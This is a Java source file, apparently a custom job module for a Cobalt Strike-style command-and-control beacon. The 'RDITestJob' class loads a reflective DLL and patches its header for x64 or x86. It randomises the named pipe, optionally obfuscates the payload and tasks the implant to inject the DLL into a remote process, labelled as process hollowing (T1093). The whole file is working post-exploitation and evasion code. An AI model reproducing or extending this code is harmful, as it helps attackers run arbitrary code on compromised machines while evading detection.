package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.ReflectiveDLL;

public class RDITestJob extends Job {
    public RDITestJob(TaskBeacon var1) {
        super(var1);
    }

    @Override
    public String getDescription() {
        return "RDITest";
    }

    @Override
    public String getShortDescription() {
        return "RDITest";
    }

    @Override
    public String getDLLName() {
        return "CustomResources/RDI/reflective_dll.dll";
    }

    @Override
    public String getPipeName() {
        return "RDITest";
    }

    @Override
    public int getCallbackType() {
        return 0;
    }

    @Override
    public int getWaitTime() {
        return 15000;
    }

    //不经过加密来读取
    public void spawn(String var1, String var2) {
        this.arch = var2;
        byte[] var3 = CommonUtils.readResource(this.getDLLName());
        if (var2.equals("x64")) {
            var3 = ReflectiveDLL.patchDOSHeaderX64(var3, 1453503984);
            if (this.ignoreToken()) {
                this.builder.setCommand(44);
            } else {
                this.builder.setCommand(90);
            }
        } else {
            var3 = ReflectiveDLL.patchDOSHeader(var3, 1453503984);
            if (this.ignoreToken()) {
                this.builder.setCommand(1);
            } else {
                this.builder.setCommand(89);
            }
        }

        String var4 = "\\\\.\\pipe\\" + CommonUtils.garbage(this.getPipeName());
        var3 = CommonUtils.strrep(var3, "\\\\.\\pipe\\" + this.getPipeName(), var4);
        var3 = this.fix(var3);
        if (this.tasker.obfuscatePostEx()) {
            var3 = this._obfuscate(var3);
        }

        var3 = this.setupSmartInject(var3);
        this.builder.addString(CommonUtils.bString(var3));
        byte[] var5 = this.builder.build();
        this.builder.setCommand(this.getJobType());
        this.builder.addInteger(0);
        this.builder.addShort(this.getCallbackType());
        this.builder.addShort(this.getWaitTime());
        this.builder.addLengthAndString(var4);
        this.builder.addLengthAndString(this.getShortDescription());
        byte[] var6 = this.builder.build();
        this.tasker.task(var1, var5, var6, this.getDescription(), this.getTactics("T1093"));
    }
}
